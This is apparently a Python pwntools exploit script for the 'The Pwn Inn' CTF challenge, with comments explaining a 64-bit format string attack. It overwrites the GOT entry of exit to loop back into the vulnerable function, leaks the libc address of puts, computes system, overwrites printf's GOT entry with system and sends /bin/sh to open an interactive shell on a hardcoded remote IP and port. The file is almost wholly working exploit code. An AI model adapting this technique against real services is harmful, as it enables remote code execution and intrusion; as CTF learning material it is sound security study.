#!/usr/bin/env python
#Using checksec we found that the binary has only NX and Partial Relro.After debugging the binary only a format string attack seems to be the perfect option.
#The program uses exit after the printf call lets try routing the program again and again by overwriting the GOT entry of exit to address of vuln function..
#Then leak the libc address of any function I chose puts here ..Let's check the libc address to take the libc version and find the base address and system 
#address..After getting the system address overwrite the GOT entry of printf with system because the printf's arguement is a user controlled input which 
#allows us to execute system commands after the next call to printf which is now system...Then a input of /bin/sh to the fgets ...
#Voilla !! You got yourself a shell.

from pwn import *

context.clear(arch='amd64')                       #This is important because the fmtstr_payload will make payload based on the context.clear arch value  
e = ELF("./the_pwn_inn")                          #which the default arch is i386 which will make 32 bit format string payload...
r = remote("161.97.176.150",2626)
r.recvline()
exit_overwrite = fmtstr_payload(6,{e.got.exit:e.sym.vuln},write_size="short") #The fmtstr_payload function with the offset 6 determined using AAAA 
r.sendline(exit_overwrite)                                                    #which gave 41414141 in the 6 th position in output and also the write of exit  
r.recv()                                                                      #overwrite with the value of vuln function address and write size as short  
libc_leaker = b' -%7$s- '                                                     #This input is used to leak libc address of puts to calculate libc offset and
libc_leaker += p64(e.got.puts)                                                #find libc version
r.sendline(libc_leaker)
r.recvuntil(b"-")                                                           
leaked_address = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,"\x00"))  #the above recvuntil and this line is used to get the libc address
log.info("The leaked libc address is " + hex(leaked_address))                 #Just a terminal output of the leaked libc of puts function
base_address = leaked_address - 554400                                        #calculating libc base 
system_address = base_address + 349200                                        #calculating system function address
log.info("The base address is " + hex(base_address))                          #terminal output of the base address
log.info("The system function address is " + hex(system_address))             #terminal output of the system address
system_overwrite=fmtstr_payload(6,{e.got.printf:system_address},write_size="short")  #Overwriting the printf got entry with the system function libc address
r.sendline(system_overwrite)
r.recv()                                          #The two recv's and a recvuntil below will sanitize the output when we enter the shell
r.recv()                                          
cmd = b'/bin/sh'                                  #The printf arguement we feed which is now system function after the format string overwrite 
r.sendline(cmd)
r.recvuntil(b"@@")
r.interactive()
r.close()

#I always had troubles making large writes using raw writes and this becomes really hard when in 64 bit binary ..I made this exploit using this awesome writeup 
#https://github.com/mutur4/CTF-WRITEUPS-2021/blob/main/0x41414141%20CTF/The Pwn Inn/exploit.py... And also during the CTF i didn't solve this challenge because 
#of a weird misconception that Partial RELRO will make the GOT readonly after executing the function for the first time..After the CTF while discussing 
#came to know that it is fini_array that is not writable which is the difference between NO Relro and Partial Relro in both of these GOT remains writable..
#This challenge had to say taught me a quite a lot things ..
